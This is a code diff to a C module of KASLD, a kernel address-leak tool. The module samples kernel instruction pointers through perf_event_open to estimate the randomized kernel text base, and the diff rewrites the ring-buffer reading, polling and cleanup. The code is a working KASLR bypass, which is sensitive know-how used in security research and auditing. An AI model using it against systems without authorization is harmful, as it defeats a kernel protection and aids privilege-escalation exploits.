@@ -30,6 +30,7 @@
 #include "include/kasld/api.h"
 #include <errno.h>
 #include <linux/perf_event.h>
+#include <poll.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -40,6 +41,7 @@
 #include <sys/syscall.h>
 #include <sys/types.h>
 #include <sys/utsname.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 KASLD_EXPLAIN(
@@ -61,127 +63,151 @@ static int perf_event_open(struct perf_event_attr *attr, pid_t pid, int cpu,
   return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
-static unsigned long get_kernel_addr_perf(void) {
-  int fd;
-  pid_t child;
-  unsigned long iterations = 100;
+/* Multi-page data ring: must be (1 + 2^n) pages. ring_copy() below handles
+ * records that straddle the buffer end. */
+#define DATA_PAGES 16
 
+/* Target sample count and outer timeout. sample_period below is chosen so a
+ * busy syscall child generates hundreds of samples per second, comfortably
+ * under the kernel's perf_event_max_sample_rate throttle. */
+#define TARGET_SAMPLES 100
+#define POLL_MS_PER_ROUND 200
+#define MAX_ROUNDS 50
+
+/* Copy `n` bytes out of the ring at byte offset `off`, handling wrap. */
+static void ring_copy(const char *ring, size_t ring_size, uint64_t off,
+                      void *dst, size_t n) {
+  size_t off_in = (size_t)(off % ring_size);
+  size_t first = ring_size - off_in;
+  if (first >= n) {
+    memcpy(dst, ring + off_in, n);
+  } else {
+    memcpy(dst, ring + off_in, first);
+    memcpy((char *)dst + first, ring, n - first);
+  }
+}
+
+static unsigned long get_kernel_addr_perf(void) {
   printf("[.] trying perf_event_open sampling ...\n");
 
-  child = fork();
-
+  pid_t child = fork();
   if (child == -1) {
     perror("[-] fork");
     return 0;
   }
-
   if (child == 0) {
     struct utsname self;
     while (1)
       kasld_uname(&self);
-    return 0;
+    _exit(0);
   }
 
-  struct perf_event_attr event = {.type = PERF_TYPE_SOFTWARE,
-                                  .config = PERF_COUNT_SW_TASK_CLOCK,
-                                  .size = sizeof(struct perf_event_attr),
-                                  .disabled = 1,
-                                  .exclude_user = 1,
-                                  .exclude_hv = 1,
-                                  .sample_type = PERF_SAMPLE_IP,
-                                  .sample_period = 10,
-                                  .precise_ip = 1};
+  /* Attribute setup:
+   *  - sample_period 10000 ticks of SW_TASK_CLOCK = roughly one sample per
+   *    10 microseconds of task time. This stays well under the default
+   *    perf_event_max_sample_rate (~100K/s); periods much smaller than this
+   *    trip the throttle and the kernel emits PERF_RECORD_THROTTLE records
+   *    in place of PERF_RECORD_SAMPLE.
+   *  - precise_ip is unset because PEBS/IBS only applies to hardware events.
+   *  - wakeup_events = 1 makes poll() return on every record. */
+  struct perf_event_attr event;
+  memset(&event, 0, sizeof(event));
+  event.type = PERF_TYPE_SOFTWARE;
+  event.config = PERF_COUNT_SW_TASK_CLOCK;
+  event.size = sizeof(event);
+  event.disabled = 1;
+  event.exclude_user = 1;
+  event.exclude_hv = 1;
+  event.sample_type = PERF_SAMPLE_IP;
+  event.sample_period = 10000;
+  event.wakeup_events = 1;
 
-  fd = perf_event_open(&event, child, -1, -1, 0);
-
+  int fd = perf_event_open(&event, child, -1, -1, 0);
   if (fd < 0) {
-    perror("[-] syscall(SYS_perf_event_open)");
-    if (child)
-      kill(child, SIGKILL);
-    if (fd > 0)
-      close(fd);
-    return 0;
-  }
-
-  uint64_t page_size = getpagesize();
-  struct perf_event_mmap_page *meta_page = NULL;
-  meta_page =
-      mmap(NULL, (page_size * 2), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-
-  if (meta_page == MAP_FAILED) {
-    perror("[-] mmap");
-    if (child)
-      kill(child, SIGKILL);
-    if (fd > 0)
-      close(fd);
-    return 0;
-  }
-
-  if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {
-    perror("[-] ioctl");
-    if (child)
-      kill(child, SIGKILL);
-    if (fd > 0)
-      close(fd);
-    return 0;
-  }
-  char *data_page = ((char *)meta_page) + page_size;
-
-  size_t progress = 0;
-  uint64_t last_head = 0;
-  size_t num_samples = 0;
-  unsigned long min_addr = ~0;
-  while (num_samples < iterations) {
-    /* is reading from the meta_page racy? no idea */
-    while (meta_page->data_head == last_head)
-      ;
-    ;
-    last_head = meta_page->data_head;
-
-    while (progress < last_head) {
-      struct __attribute__((packed)) sample {
-        struct perf_event_header header;
-        uint64_t ip;
-      } *here = (struct sample *)(data_page + progress % page_size);
-      switch (here->header.type) {
-      case PERF_RECORD_SAMPLE:
-        num_samples++;
-        if (here->header.size < sizeof(*here)) {
-          fprintf(stderr, "[-] perf event header size too small\n");
-          if (child)
-            kill(child, SIGKILL);
-          if (fd > 0)
-            close(fd);
-          return 0;
-        }
-
-        uint64_t prefix = here->ip;
-
-        if (prefix < min_addr)
-          min_addr = prefix;
-        break;
-      case PERF_RECORD_THROTTLE:
-      case PERF_RECORD_UNTHROTTLE:
-      case PERF_RECORD_LOST:
-        break;
-      default:
-        fprintf(stderr, "[-] unexpected perf event: %x\n", here->header.type);
-        if (child)
-          kill(child, SIGKILL);
-        if (fd > 0)
-          close(fd);
-        return 0;
-      }
-      progress += here->header.size;
-    }
-    /* tell the kernel we read it. */
-    meta_page->data_tail = last_head;
-  }
-
-  if (child)
+    int e = errno;
     kill(child, SIGKILL);
-  if (fd > 0)
+    waitpid(child, NULL, 0);
+    errno = e;
+    perror("[-] perf_event_open");
+    return 0;
+  }
+
+  long page_size = sysconf(_SC_PAGESIZE);
+  if (page_size <= 0) {
     close(fd);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+  size_t ring_size = (size_t)page_size * DATA_PAGES;
+  size_t map_size = (size_t)page_size + ring_size;
+
+  void *base = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (base == MAP_FAILED) {
+    perror("[-] mmap");
+    close(fd);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+
+  if (ioctl(fd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
+    perror("[-] PERF_EVENT_IOC_ENABLE");
+    munmap(base, map_size);
+    close(fd);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
+    return 0;
+  }
+
+  struct perf_event_mmap_page *meta = base;
+  const char *ring = (const char *)base + page_size;
+
+  size_t num_samples = 0;
+  unsigned long min_addr = ~0UL;
+  struct pollfd pfd = {.fd = fd, .events = POLLIN};
+
+  for (int round = 0; round < MAX_ROUNDS && num_samples < TARGET_SAMPLES;
+       round++) {
+    if (poll(&pfd, 1, POLL_MS_PER_ROUND) <= 0)
+      break;
+
+    uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
+    uint64_t tail = meta->data_tail;
+
+    while (tail < head) {
+      struct perf_event_header header;
+      if (head - tail < sizeof(header))
+        break;
+      ring_copy(ring, ring_size, tail, &header, sizeof(header));
+      if (header.size < sizeof(header) || header.size > 1024)
+        break;
+      if (head - tail < header.size)
+        break;
+
+      if (header.type == PERF_RECORD_SAMPLE) {
+        /* Record layout for sample_type=PERF_SAMPLE_IP:
+         *   { struct perf_event_header header; u64 ip; } */
+        if (header.size >= sizeof(header) + 8) {
+          uint64_t ip;
+          ring_copy(ring, ring_size, tail + sizeof(header), &ip, 8);
+          if (ip < min_addr)
+            min_addr = (unsigned long)ip;
+          num_samples++;
+        }
+      }
+      /* PERF_RECORD_THROTTLE / UNTHROTTLE / LOST and anything else: skip. */
+      tail += header.size;
+    }
+
+    __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
+  }
+
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+  munmap(base, map_size);
+  close(fd);
+  kill(child, SIGKILL);
+  waitpid(child, NULL, 0);
 
   if (min_addr >= KERNEL_VIRT_TEXT_MIN && min_addr <= KERNEL_VIRT_TEXT_MAX)
     return min_addr;
@@ -196,9 +222,18 @@ int main(void) {
     return 0;
   }
 
-  printf("lowest leaked address: %lx\n", addr);
-  printf("possible kernel base: %lx\n", addr & -KASLR_VIRT_ALIGN);
-  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
+  /* Floor the captured minimum to KASLR_VIRT_ALIGN before emitting. The
+   * sample IP sits at text_base + offset; we don't know the offset, only
+   * that it is non-negative. Floor(min, KASLR_VIRT_ALIGN) is still a sound
+   * upper bound on text_base (text_base is itself KASLR_VIRT_ALIGN-aligned),
+   * and it is tighter than the raw value because the engine's
+   * C_AT_LEAST_ALIGN constraint only raises the resolver's lower bound, not
+   * the upper bound. Emitting raw would put a CONF_PARSED upper bound at
+   * an instruction-granularity address, shadowing other sources whose
+   * values are already properly aligned. */
+  unsigned long emit_addr = addr & -(unsigned long)KASLR_VIRT_ALIGN;
+  printf("lowest leaked address: %lx  emit (aligned): %lx\n", addr, emit_addr);
+  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, emit_addr, NULL,
                       CONF_PARSED);
 
   return 0;
